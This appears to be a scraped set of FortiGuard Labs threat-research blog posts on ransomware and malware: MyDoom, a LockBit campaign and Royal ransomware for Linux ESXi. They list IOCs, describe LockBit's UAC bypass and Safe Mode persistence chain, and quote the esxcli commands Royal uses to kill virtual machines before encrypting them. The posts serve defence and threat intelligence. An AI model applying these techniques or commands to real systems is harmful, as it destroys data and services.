bff07ae5ccea66b658783fcf940eaf6baa453b534af2ebe9b70f14923871d82f ALC ransomware dc50ac15414b7274533cde5e1b28bfaa85353de38d4b21a8cb996412c0f6e432 ALC ransomware 0abe1ab9c75395a4ca829028d9c8c6530bd3bfda49e4b856b6f3539b9aa36ea5 ALC ransomware 1c5377db817c03f3c2711d351e380611291b5935ba0e2b0de763e4ef470e5bab ALC ransomware 456961cba9a8dfce1b66081c6a73c2f1ec676fcdedac24c678f890a3425e7260 ALC ransomware 48b074b48bde3f15ca28983f26e855bafd6f19e8240d938b14f31417b39d9fd2 ALC ransomware 7efa5acd25e6276d122b2e2b8055a64dc4c757fc6067d3307973327154a507ff ALC ransomware 84d4ca11c23a20bb220c15dbe3a363fb774081b6106c351fc9d8eab4f3b5b62c ALC ransomware Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). If you think this or any other cybersecurity threat has impacted you, please contact ourGlobal FortiGuard Incident Response Team. FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,FortiGuards Labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-sirattacker-acl"
  },
  {
    "title": "Just Because It’s Old Doesn’t Mean You Throw It Away (Including Malware!)",
    "content": "FortiGuard Labs Threat Research Art, automobiles, and wine are often associated with things that appreciate in value as they age. Malware isn’t usually thought of this way, as most threat actors strive to keep their tools as current as possible with new lures and exploitation techniques. However, every once in a while, a campaign appears that turns this paradigm on its head. FortiGuard Labs came across one such recent campaign using the MyDoom worm. MyDoom (also known as Novarg and Mimail) was first discovered back in 2004. And while it has seen some updates and modifications since its introduction, it is an anachronism in the malware world that continues to operate well beyond expectations. Affected Platforms:WindowsImpacted Users:Windows usersImpact:Potential to deploy additional malware for additional purposesSeverity Level:Medium The typical MyDoom phishing e-mail contains subjects referencing a delivery error or testing. Email headers contain a rejection reason and a custom “Content-Type”. There is also an attachment that may or may not be zipped. This attachment (unless zipped) is the MyDoom executable. FortiGuard Labs encountered the following message subjects in our recent investigation: The following attachment names were also found to be used repeatedly: The MyDoom executables attached to its phishing e-mails have an extension hidden by default by most Windows deployments (.cmd, .scr, .com, etc.). This increases the chances that users won’t identify it as malicious. Despite the extension, the file is a 32-bit Windows executable packed using the UPX (Ultimate Packer for Executables) packer (https://en.wikipedia.org/wiki/UPX) to compress and make it more difficult to analyze. With that being said, UPX has been around for quite some time. When used without modification, it is quite easy to decompress the original executable using the tool itself. The packer decompresses and executes the actual MyDoom code. Upon execution, an attempt to alter the Windows firewall settings is made. A user logged on to the system would see a request to grant access for the executable to communicate out through the Firewall. MyDoom next makes a copy of itself, places it in the “Temp” folder (C:\\Users\\<user>\\AppData\\Local\\Temp), and changes the name to a known Windows application/process. In this case, it used “lsass.exe”. It also creates a file full of garbage text that is not referenced again once created. MyDoom communicates over port 1042 to both send and receive. It rotates through a number of possible C2 domains in an attempt to locate an active one. As part of the legacy of spreading through file-sharing utilities, MyDoom also litters the “C:\\Program Files\\Common Files\\Microsoft Shared” folder with multiple versions of itself. It renames itself as some now very old and obsolete applications (e.g., Kazaa Lite) with a random name or phrase attached. Application names include: Despite its advanced age, there are still fresh infections of MyDoom occurring in the wild, along with corresponding phishing events. This goes to show that even older malware can still be dangerous no matter their age Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services: FortiGuard customers are protected against this latest MyDoom campaign, which is blocked by FortiMail. The following (AV) signature detects the malware samples mentioned in this blog W32/MyDoom.M@mm W32/Mydoom.E!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats, including theFortiPhish Phishing Simulation Service, which uses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. IOCs File-based IOCs: Filename SHA256 9ed08@7686f6a96.com 5a6c1929f55baff2e786336c07f02c5d13194ff765073dcdfcae1b0cb53da5bc 5713a@7686f6a96.com 1b1e2421dc3d96a8b9dd58d9cc74730c966250df7c33a1e0df50d983e674b7bc atpysig.exe 6223e126a65ba888182d3369adacc7268bd78555f0426653f5b5dd963d4c31a4 attachment.doc.scr ad37758c362a38a8718837ece40ed5699e40de11ed58a586c2a6a6d8bb5251bf attachment.scr 9fc0179c7407476ced89b6124fa52f10d178f3a07e3d50c860b1ced98fb77541 attachment.doc.scr ad37758c362a38a8718837ece40ed5699e40de11ed58a586c2a6a6d8bb5251bf ATTACHMENT.SCR 1302161ca791b3fc01188582a075bbfcfeb5f28715ad527be0fe625ec452b1eb attachment.scr 9fc0179c7407476ced89b6124fa52f10d178f3a07e3d50c860b1ced98fb77541 ATTACHMENT.SCR 1302161ca791b3fc01188582a075bbfcfeb5f28715ad527be0fe625ec452b1eb document.doc 31fd079696a071a48fd4a66588adb22e36dd96028792fb416bcee0f099d6e5cb document.doc 5e99396cf134fea102470525d5105afb697b9131d891990e2dc8c9e5e34f8165 file.htm.scr 009ac15d56c3a5149f10c833b5cc191eede4d33485cab7bc3dd94675a462608c golfasian.com 9fcf4b0e00d20060274861b41b2c13b68dfedbd2ac0012436b13960b2a570d4f golfasian.com 34d9e11e71fe18f9eb290461714826e1069a129d44db25c6c4fe581f883cbc07 golfasian.com 6155f0562adfaa75cf46f674cf094d3f23c27b38c8009b6982f48ca4e77c95b1 golfasian.com 92018aff6737899f94aed2461b6e4182383b6677be2e8d4f82098265d74fb913 html.pif eba7ec36cb9cc3c3677f5325ee9f755fefe885235849aede61a0b130a9f6255b html.pif d438e3ec7bd0fa4b231a6a1704d89f117d3b6b6ba342915b4d095027d0fe4c90 john2@golfasian.com a966f61a86dae4737f99d5b7668b0fcab3124125d2030faa08855ae12c9525ee letter.exe 48c70041def3bf288f7f85ee96eb59a2f7d965963a66e0c86fb3c88b3e079386 letter.scr 2ddc70753893167b7b5d15c1e3cf6f22b6d8a0ee8a4aaea93c40655608f6fc75 mail.html 20b372391f4d0fd9e4f69fc950456b557fab27f7bbbdeede36cff404e35614aa message.bat 7b596caceaf2e8a139c01eaf67e5e52ff3247ca6d20112ea9ce59a02a1a5bb7d message.scr 2744c29d98a144fabda0ac75264235cd82b798f3bd5a56fab2ad28ec218b94c8 Message.scr eb5bfbb3be5300c1231a8ece93d239b7a02a4f308d7efe85d604f06d3aca57ad readme.scr 8d4dcf463e7a69cd1b3039779d9d36c8a4669444b30d3261f876b7720bdb6752 text.cmd 5cb5efc8e0be0bf32eb73fbdaebedacf70cba946f5dfaea7166dcd0f4ca5989f tracy@golfasian.com c12e27b30706dd1d11e5822285e209a187724148a682d178f1e2bc3f8d670ea7 transcript.htm.pif 2ddc70753893167b7b5d15c1e3cf6f22b6d8a0ee8a4aaea93c40655608f6fc75 transcript.txt 6bbcc015c5a72b03601f8087c57024a7e74975dfb567b867c3404958e4239c9c txt.pif d599d4343fe3d831bcad8ea7305f050608a182f99636ea9e87c9400d19fae043 txt.scr f5dc449255319cebd38ce255060a8019e0f5697de8ac31353c7d067d9e1218e6 document.zip 11a86a2388c501773b52ae79ee1f7504caca6c25d835d40b8afc9ebe29c7a26d .zip 942ef9da07de7d70c2efcfc20e375e6919a521d44ddabf9369042aea1553f712 message.zip 10502c24bb63af929da22ec306f44f9e557b4e3bbf588afd1a7f190aa9840938 letter.zip 21ee754775ca9f76b2d18d0b87722ffa0c9ab0f676e4aa6ac4881dff580087ac .zip 505b177a6c24c69a9fda1e78db7421fad4893d7c07e3cea91897decfbc4510be message.zip ad29b1c0423a878758a444ad6bf38aa2ad276a98f0ca552b475d890db631f48b file.zip 113db96ddc72fb3300e981c7691cd202d3d0a5b097e84cd41eee6a54d868bf31 transcript.zip 3df99ae8f2083419fd030c42ca6729b6e5319df6aca1204d7081ce6ea91c69da transcript.zip 04123ec908c4a60282fa35fed76a377b22a49b6f9bfaf5a81121fd7204b4b83d .zip 4864f84ea0f6939751310a2cca43e71a57171f37679cb7853d29a083b1617a09 .zip 35bb66f1cc9e820ef50c22d0abb0f5f7ba8724bebb4a5a795e68790943742928 .zip 9bf413a9d9b3b17767f0a93450f834947475765b2fd1ecccaa943f8ce9d58082 document.zip 9a2f837a8adb16632ce4ec3c8b02037a4e96e66e6737ef1169afb2e48e46aa6a letter.zip bfaf49a691792a29024a75119a9841caacefb306494ca011a42b46c12ca65895 .zip 59ad199d81590be7b83768227fe3a79b115f6c978b8715864ae0e22e5d324e36 mail.zip ecda9c446dd6aa0018cd5fc9c99ba846484f8d2a81d7f97167d89b890e4d5c1a attachment.zip e745cc1ae5a89a9f2b4b0eabbac342520703b03f68dafeb6d29194fe19e899e9 attachment.zip 1f442b9ff3c9225e3eaa9c74d16b3a74117bb66e1d372ca15b6154d386a93e57 Network-Based IOCs: IOC IOC type 15.244.197.9:1042 Attempted C2 Connection 141.240.203.6:1042 Attempted C2 Connection 16.115.197.163:1042 Attempted C2 Connection 67.120.102.206:1042 Attempted C2 Connection 220.234.104.158:1042 Attempted C2 Connection 166.77.123.68:1042 Attempted C2 Connection 198.89.160.22:1042 Attempted C2 Connection 15.98.11.12:1042 Attempted C2 Connection 67.121.94.10:1042 Attempted C2 Connection 15.24.69.27:1042 Attempted C2 Connection 129.204.109.121:1042 Attempted C2 Connection 70.241.87.215:1042 Attempted C2 Connection 16.80.195.68:1042 Attempted C2 Connection 15.9.79.129:1042 Attempted C2 Connection 15.14.59.199:1042 Attempted C2 Connection 216.114.194.30:1042 Attempted C2 Connection 15.228.15.126:1042 Attempted C2 Connection 16.100.121.101:1042 Attempted C2 Connection 15.63.9.76:1042 Attempted C2 Connection 65.6.113.38:1042 Attempted C2 Connection 141.240.211.237:1042 Attempted C2 Connection 16.83.199.36:1042 Attempted C2 Connection 66.248.57.65:1042 Attempted C2 Connection 15.59.127.133:1042 Attempted C2 Connection 16.150.138.126:1042 Attempted C2 Connection 141.154.253.115:1042 Attempted C2 Connection 66.43.244.133:1042 Attempted C2 Connection 68.158.45.83:1042 Attempted C2 Connection 152.16.43.135:1042 Attempted C2 Connection 129.81.101.242:1042 Attempted C2 Connection 16.102.137.19:1042 Attempted C2 Connection 16.102.153.27:1042 Attempted C2 Connection 67.171.253.156:1042 Attempted C2 Connection 15.75.188.252:1042 Attempted C2 Connection 216.128.188.41:1042 Attempted C2 Connection 16.126.107.216:1042 Attempted C2 Connection 16.125.202.53:1042 Attempted C2 Connection 162.28.185.188:1042 Attempted C2 Connection 195.75.252.98:1042 Attempted C2 Connection 68.223.45.7:1042 Attempted C2 Connection 24.148.141.102:1042 Attempted C2 Connection 141.240.190.28:1042 Attempted C2 Connection 129.243.132.29:1042 Attempted C2 Connection 148.193.135.228:1042 Attempted C2 Connection 24.190.210.189:1042 Attempted C2 Connection 12.166.196.8:1042 Attempted C2 Connection 15.228.161.161:1042 Attempted C2 Connection 220.234.104.158:1042 Attempted C2 Connection email phishing,FortiGuards Labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/just-because-its-old-doesnt-mean-you-throw-it-away-including-malware"
  },
  {
    "title": "Can You See It Now? An Emerging LockBit Campaign",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs has observed a new LockBit ransomware campaign during last December and January using a combination of techniques effective against AV and EDR solutions. LockBit has been one of the more dangerous ransomware, active since 2019. It was part of several successful attacks against a large variety of industries, including critical infrastructure. This blog post discusses the infection chain and Tactics, Techniques, and Procedures (TTPs) of this campaign. Descriptions of the attack refer to the stages outlined in Figure 1 below. The attack starts with a .img container (1) and a social engineering technique of displaying a single file once it’s mounted while hiding the rest of its files from the user. It can also cause malware analysts to miss the payloads while examining the samples manually. The user is then prompted to open the single visible shortcut (2) file. In some of the cases that we’ve observed, a python script is executed (2.1) using the official Python embed package. The only purpose of the script is to run the subsequent BAT scripts. Some variants used a known UAC bypass method abusing the legitimatefodhelper.exe(3.1). This enables the attacker’s BAT file to run in a new elevated process without the user’s approval. The BAT script (4) does several things: 1.     Changes the password of the logged-in user. 2.     Copies its files to C:\\ProgramData. 3.     Ensures that after the system reboots, it logs in without user interaction (usingSysInternals Autologon). 4.     Tries to - a.     Set the next reboot to be in Safe Mode using bcdedit.exe. b.     Register a new service that will run its VBS script (4.1) using sc.exe. c.      Sets the service to run also in Safe-Mode using reg.exe. 5.     If it fails, it sets in the registry a BAT file (4.2) to be run on logon as another UI shell by Winlogon. 6.     Reboots the machine. The ransomware executable resides within a password-protected archive. The script that runs after boot executes another BAT script (4.3) to extract the ransomware payload. It uses the 7-zip archiver and then runs it with a ‘-pass’ argument that is needed for the malicious executable to unpack itself. The final payload is LockBit. Analysts from TrendMicro have published ananalysisof the ransomware. Targeting focuses on Spanish-speaking victims – all samples target Mexican or Spanish firms, mainly in the consulting and law sectors. Ransomware note: Your data are stolen and encrypted The data will be published on TOR website if you do not pay the ransom You can contact us and decrypt one file for free on this TOR site (you should download and install TOR browser first https://torproject.org) http://<onion address> Your company id for log in: <unique id> The detection rate of the samples in VirusTotal was a minimal single digit, with some completely undetected, suggesting the campaign’s methods are effective in defense evasion. Delivery through a .img container bypasses the Mark of The Web (MOTW) protection mechanism. Multi-stage scripts that extract a password-protected ransomware executable, which is unpacked only when run with a unique password, allow evading traditional signature-based detection. The malware authors have shown a creative and wide-ranging usage of signed, legitimate executables: the mounting of .img files by Windows Explorer, python execution by a signed interpreter, the extraction of encrypted archives by 7-zip, and automatic log-in using Sysinternals’ Autologon. This allows for minimal reliance on custom code, trimming development costs, and staying under the radar of EDRs. This campaign’s highly evasive nature demonstrates that attackers continue to leverage increasingly obscure methodologies to avoid detection. This unique combination of executables wasn’t seen in previous LockBit attacks. These payloads may be related to the LockBit builderleak in late 2022. Hence, a definitive attribution to the original group behind LockBit, or its affiliates, may be difficult. Other cybercriminals would want to associate themselves with the deterrence already afforded by past acts of LockBit. FortiEDR detects and blocks these threats out of the box without any prior knowledge or special configuration. It does this using its post-execution prevention engine to identify malicious activities: All network IOCs have been added to the FortiGuard WebFilter blocklist. FortiGuard Antivirus has coverage in place as follows: W32/Lockbit.K!tr.ransom The FortiGuard Antivirus service engine is included in Fortinet’s FortiGate, FortiMail, FortiClient, and FortiEDR solutions. In addition, as part of our membership in theCyber Threat Alliance, details of this threat were shared in real-time with other Alliance members to help create better protections for customers. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. Tactic \\ Technique ID Description TA0002 Execution T1059.003 Command and Scripting Interpreter: Windows Command Shell T1059.005 Command and Scripting Interpreter: Visual Basic T1059.006 Command and Scripting Interpreter: Python T1204.002 User Execution: Malicious File TA0003 Persistence T1547.004 Boot or Logon Autostart Execution: Winlogon Helper DLL T1053.005 Scheduled Task/Job: Scheduled Task T1543.003 Create or Modify System Process: Windows Service TA0005 Defense Evasion T1553.005 Subvert Trust Controls: Mark-of-the-Web Bypass T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control T1027.002 Obfuscated Files or Information: Software Packing T1562.009 Impair Defenses: Safe Mode Boot TA0040 Impact T1486 Data Encrypted for Impact T1529 System Shutdown/Reboot IMG SHA256 1ef3ae251833be08b6f3e525969ae02c28cb0238e3adb3091e572a10633f7ef7dad61d9f919a9cc84ae633e948946e7546b21dc4d9d47d19d96fd308c7de40cbd73bcd2e29191b260a26d87c3035bde33163cc319649291db9f04c48c94da896ee2b182a56ded459a113513985ff624631a9515c7efa2282708483ace640eb3adca325a0028dc8e41dcf739cd00701a19066fc88c0d22be5316f7a4b7b219fe835bf036bf46fa21f3354d60a2c50d2959e1e9193bec8364575dc3fd4644732ae781ead305cdb5fa0153369431dedd40fe138308fcdf5dfda1cfeaaba296752e31ef3ae251833be08b6f3e525969ae02c28cb0238e3adb3091e572a10633f7ef7dad61d9f919a9cc84ae633e948946e7546b21dc4d9d47d19d96fd308c7de40cbd73bcd2e29191b260a26d87c3035bde33163cc319649291db9f04c48c94da896ee2b182a56ded459a113513985ff624631a9515c7efa2282708483ace640eb3adca325a0028dc8e41dcf739cd00701a19066fc88c0d22be5316f7a4b7b219fe835bf036bf46fa21f3354d60a2c50d2959e1e9193bec8364575dc3fd4644732ae781ead305cdb5fa0153369431dedd40fe138308fcdf5dfda1cfeaaba296752e31858a862390adcaa4cea6782e7dba077697475ff9ada9d75c4897ccd563998af Ransomware Executables SHA256 Name cb049c6e59106bbdfd804a9d02bb31ea09a3918018cbb97fb12d2bcf9e475465 documentos.exe 334148a7434f4fd27dcc6600edc2f29e4f11ada0be9f71f807cbd4154abd74be documentos.exe fd3577ff36496320485ffa05681ffa516a56fc4818c3fc89774aa4bb20e2c17f documentos.exe 8465c979990e75262d15e93453287d6107f008035d6d6a05bd3a92c2e3fe1d40 HacAK.exe 40828437094a02ab467a0c0343d08c110d3b0c2972b609bcdd355667614209f EMJgp.exe 50f49ac742a127085e0a824bcae7e25326ea0ef0741f0abe34ce494f2c4ef4d2 byhHI.exe cc58dcd32a440e7f95d19b653a55c1e2c383efc2bd19443238dd3008c1cbe147 bOpDX.exe 6eb6431dcfb1e7105fb05e2d8b01e231f6d4b82a1df3639499d0adacd00757cc gVozH.exe Domains poliovocalist[.]com IPs 198.244.187[.]248 150.129.218[.]231 LockBit Portal URLs hxxp://lockbit3jx6je7tm6hhm6zzafgy6hpil3ur6jmc2a4ugan7xzztv6oqd[.]onion hxxp://lockbitdvbpfczc3yrs37kpp6avnrgr7yygi2f45qxvef2yqi36lpxyd[.]onion hxxp://lockbit3hc6syym13ki2ag5jskr6q5qa3spspjpmtfhh6fufut737zid[.]onion hxxp://lockbitov3afmxgknfhk2o5d4uqrhygd7ty3xqm56qd6zjlu6u43pgyd[.]onion ransomware,FortiEDR,fortiguard labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/emerging-lockbit-campaign"
  },
  {
    "title": "Key Findings from the 2H 2022 FortiGuard Labs Threat Report",
    "content": "FortiGuard Labs Threat Research In the first half of 2022, FortiGuard Labs observed an overall increase in attack frequency paired with the explosive growth of new variants associated with familiar tactics. While attack volume isn’t showing any signs of slowing, the back half of the year gave rise to some other distinct trends in activity. For starters, our team witnessed destructive wipermalware attacksimpacting more organizations across the globe, as well as enterprising cybercriminals reimagining existing botnets and reusing code to power new—and more sophisticated—attacks. In our2H 2022 Threat Landscape Report, we examine the cyber-threat landscape over the year's second half to identify trends and offer insights on what security professionals should know to effectively protect their organizations in the new year and beyond. The report findings are based on the collective intelligence ofFortiGuard Labs, drawn from Fortinet’s vast array of sensors collecting billions of threat events observed around the world during this same period. Below are key takeaways from the report. We’re increasingly seeing cybercriminals take a “work smarter, not harder” approach to unveiling new tactics. From new advanced persistent cybercrime tactics to upgrading old-school botnets like Mirai, bad actors continually find more sophisticated ways to infiltrate networks, making every organization regardless of size or industry a target. In the first half of the year, we saw a resurgence in wiper malware and,as we predicted, this destructive attack playbook has only widened its foothold during the second half of 2022. Wiper malware expanded into other countries, driving a 53% increase in wiper activity from Q3 to Q4. While we initially observed wiper malware being developed and deployed by nation-state actors—particularly in parallel with the Russia-Ukraine war—we’re now seeing wipers being scaled and deployed worldwide. These new strains are increasingly being picked up by cybercriminal groups and used throughout the growing Cybercrime-as-a-Service (CaaS) network. Cybercriminals are also now developing their own wiper malware which is being used readily across CaaS organizations, meaning that the threat of wiper malware is more widespread than ever and all organizations are a potential target, not just those based in Ukraine or surrounding countries. Bad actors always seek to maximize their existing investments and knowledge in attack efforts. Botnet and malware code reuse are efficient, cost-effective ways for criminals to build upon successful attack vectors while making iterative changes, fine-tuning their attacks to sidestep detection. Similar to musicians who remix chart-topping songs, cybercriminals are reimagining old attack strains that proved successful in the past and reintroducing new and enhanced versions. In the second half of 2022, we witnessed the resurgence of familiar names among botnets and malware variants, many of which are more than a year old. For example, when examining botnet threats by prevalence, many of the top botnets are older. Mirai and Gh0st RAT continue to be popular across all regions, yet out of the top five, only RotaJakiro is from the current decade. While there are several new bots on the block, likeRaspberryRobin, we’re observing an interesting rise in attackers’ reliance on established threats. We saw a similar trend with malware. Some top strains observed in 2H 2022 such as Lazarus—which originated in 2010—are household names in cyber history. We also examined a collection of different Emotet variants to analyze their tendency to borrow code from one another. Our research showed that cybercriminals continue creating spinoffs of Emotet, with new variants breaking into roughly six different “species” of malware. Although it may be tempting to write off older threats as history, these anecdotes are a reminder that organizations across all sectors need to remain vigilant. Code reuse and retrofitting—fueled by a growing CaaS ecosystem—underscores the importance of using comprehensive, consolidated security services powered by automation to counter threats. Ransomware remains in full force, with cybercriminals constantly introducing new variants, largely thanks to the proliferation ofRansomware-as-a-Service (RaaS). In the second half of 2022, the top five ransomware families accounted for roughly 37% of all ransomware. GandCrab, aRaaS malwareintroduced in 2018, topped the list. Despite the threat actors behind GandCrab announcing that they were retiring, there were many iterations of GandCrab created during its heyday. There may still be a long tail of variants coming from this operation, which makes the work of groups likeThe Cybercrime Atlas Initiativeessential as they aim to dismantle these large-scale criminal operations permanently. Analyzing cybercriminal tactics and techniques gives us better insight into how to protect against future attack scenarios. In the second half of 2022, drive-by compromise topped the list across all regions as the most common malware delivery approach. This method involves attackers gaining access to victims' systems while browsing online and getting them to download malicious payloads. Organizations should regularly patch software and use intrusion prevention system (IPS) technology to counter this popular malware delivery method. Implementing ongoing cyber-awareness training programs for employees is also critical, as end-users are typically the first line of defense against a cyberattack. As organizations' cyber defenses are improving, bad actors have their work cut out for them as they attempt to gain access to networks and evade detection. However, the growth of CaaS means that there will continue to be a high volume of increasingly sophisticated attacks—and more new variants—for security teams to contend with. To protect against cybercriminals’ growing list of tactics, organizations must focus on consolidating their security technology, reducing the number of vendors they work with to remove complexity from day-to-day operations. In the face of a growing threat landscape, security teams should also consider working with a trusted third party to conductincident response and readiness activities—like developing playbooks and conducting tabletop exercises—to ensure they’re prepared to defend the organization when an incident occurs. The latest Global Threat Landscape Report represents the collective intelligence of FortiGuard Labs, drawn from Fortinet's vast array of sensors collecting billions of threat events observed worldwide during the second half of 2022. The FortiGuard Labs Global Threat Landscape Report uses the MITRE ATT&CK framework to describe how threat actors find vulnerabilities, build malicious infrastructure, and exploit their targets. The report covers global and regional perspectives. Download your copy of the2H 2022 FortiGuard Labs Threat Landscape Reportnow. threat research,cyber attack,threat report,wiper malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-threat-report-key-findings-2h-2022"
  },
  {
    "title": "Royal Ransomware Targets Linux ESXi Servers",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs has repeatedly warned organizations about ransomware developers' increased targeting of Linux systems. So it came as no surprise when it was reported that a new Royal Ransomware variant has started targeting Linux machines. In this blog post, you will learn about the technical details of this new Linux version. Affected Platforms: Linux, Unix, ESXiImpacted Users:Linux and Virtual Machine UsersImpact:Most files on the compromised machines are encrypted, including virtual machinesSeverity Level:Medium The functionality of the Linux version of Royal Ransomware looks pretty similar to the Windows version. However, it includes some additional functionality to target virtual machines. The sample we analyzed provided the following command line parameters: -id <32 character string>: A 32-character identification string added to the URL in the ransom note identifies the target. This is a compulsory parameter, and the ransomware does not run without it. -ep <percentage>: This parameter defines the portion of each targeted file to be encrypted. Many ransomware operators implement performance optimization strategies that do not encrypt an entire file, thus allowing the ransomware to run faster. In this sample, we found a straightforward implementation of such a strategy. Files smaller than 5,245,000 bytes are always encrypted 100%. For larger files, if the -ep parameter is used then plain and encrypted sections alternate in a way to reach the pre-chosen encryption percentage. -stopvm: This function stops virtual machines from running on the target system, probably to allow the ransomware to release the locking of related files and encrypt them. -vmonly: The name of this parameter indicates it only encrypts virtual machines. However, in the analyzed sample, this parameter did not do anything. This may be a feature that is currently being implemented. -fork: This parameter defines whether the main process should fork itself and allow the child process to do the rest of the work. -log: Sends logs to stdout. The Linux version's ability to interact with virtual machines seems to be the primary difference from the Windows versions. Currently, only the-stopvmfunction is implemented. However, the unfinished-vmonlyparameter indicates there is more to come. When-stopvmis chosen, the stop_vm() function (Figure 1) is called, which executes the following actions before encryption is started: 1)  It lists the virtual machines using the following shell command: esxcli vm process list > list 2)  It then opens the created file called ‘list’ and parses out the listed ‘World IDs’. 3)  In a child process, it then executes the following command with each World ID: esxcli vm process kill --type=hard --world-id=%s This process shuts down all running virtual machines, allowing the ransomware to encrypt these machines as well. The ransomware is deployed using the following command: # ./sample <target folder> -id <32 character ID> [other command line parameters] A target folder must be selected. Otherwise, the sample will exit before encryption. The sample we examined does not have a folder exclusion list, meaning that running the ransomware on the root folder with root privileges would corrupt the operating system. These attributes suggest that the ransomware is executed either manually or by a dropper program that specifies which folders should be encrypted. A simple execution flow looks like this: 1)Encryption test:The program runs an encryption test before doing anything else. This is probably a quality assurance function to ensure that file encryption will be clean and not corrupt the files. This could indicate that the threat actor is serious about the business and wants to ensure that recovery is possible. 2)Command line parameters: The program parses the command line parameters and stores their values for the rest of the execution. 3)Initializing a thread pool(Figure 2): A thread pool is created to execute encryption later. A separate thread is created for every online CPU core the machine has. Each thread runs the same thread_func() function. 4)Searching target files:search_files()function starts from the selected root directory and recursively searches for files. The exclusion list shown in Figure 3 ensures that files that were previously encrypted are not encrypted again and that the ransom note (readme) is not encrypted. The full path of allowed files is put in a queue to enqueue them for the worker threads. 5)Encryption: Threads in the thread pool monitor the queue of target files. When something is in the queue, a worker thread will pop the file from there and start encryption. The encryption is described in detail in the next section. 6)Renaming: As a final step, files are renamed to include the.royal_upostfix (Figure 4). The worker threads perform the encryption. Once a thread pops a new file from the queue, it starts the encryption process on that file as follows: 1)An RSA public key is loaded: An RSA public key was hardcoded in the sample we analyzed. The key is used to encrypt the AES keys that encrypt the files. 2)Random values are generated: For each file, a 32-byte random value is generated that serves as the AES file key and a 16-byte value that serves as the initialization vector for the AES encryption. 3)The file key is encrypted: The generated file key is encrypted using the RSA public key. 4)The file is encrypted: The file key is then used to encrypt the file using the AES CBC algorithm. If the file is bigger than 5245000 bytes (~5 MB), and the-epparameter was set, then only the preselected percentage of the file is encrypted alternatingly, as shown in Figure 5. 5)The key is concatenated to the encrypted file: Once the encryption is finished, the following three values are concatenated to the file: a.Encrypted file key: The decryptor probably loads and decrypts this key to decrypt the file content. b.Original file size: The file is resized to accommodate this additional information, thereby preserving the original file size for recovery. c.-ep value: The percentage of the file that was encrypted is also preserved for recovery. Figure 6 shows the hex dump of a file filled with 0x0 that was encrypted by the ransomware. The -ep value was set to 50% (0x32 in hexadecimal is 50% in decimal). At the end, we see the concatenated encrypted file key, the original file size, and the encryption percentage. All this information may be needed for the decryptor to decrypt this file. The ransom note (Figure 7) is dropped in every folder under the namereadme. OurFortiRecon Adversary-Centric Intelligenceservice is currently tracking 103 active victims of the Royal Ransomware group, primarily targeting the United States. This report shows that threat actors are actively pivoting to attack Linux/Unix environments. Although the sophistication of this sample is not comparable to state-of-the-art Windows ransomware—it doesn’t include defensive evasion, anti-analysis, etc.—it is still very effective. We expect further development from this actor and more ransomware operators turning towards targeting Linux systems. Fortinet customers are already protected from this malware through FortiGuard’s AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog 